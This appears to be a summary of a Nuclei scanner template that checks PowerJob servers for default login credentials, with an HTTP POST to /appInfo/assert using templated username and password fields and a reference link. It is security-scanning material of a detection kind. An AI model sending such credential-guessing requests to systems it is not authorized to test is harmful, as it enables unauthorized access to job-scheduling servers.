# Nuclei Template: PowerJob - Default Login
**Template ID:** powerjob-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`powerjob-default-login.yaml`)

## Vulnerability Information & PoC

## Description
PowerJob default login credentials were discovered.

## Steps to reproduce / Exploit Payload
```http
POST /appInfo/assert HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"appName":{{username}},"password":{{password}}}
```

## References
- https://www.yuque.com/powerjob/guidence/trial
